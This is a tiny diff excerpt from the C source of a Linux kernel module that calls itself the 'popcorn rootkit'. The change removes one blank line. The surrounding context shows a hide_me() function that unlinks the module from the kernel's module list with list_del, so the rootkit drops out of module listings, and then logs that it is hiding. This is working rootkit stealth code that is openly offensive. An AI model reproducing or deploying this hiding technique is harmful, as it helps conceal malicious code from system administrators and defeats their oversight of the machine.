@@ -8,7 +8,6 @@ static struct list_head * prev_module;
     So We Can Append Ourselves In Later
 */
 void hide_me(void) {
-
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     printk(KERN_INFO "Hiding popcorn rootkit!\n");
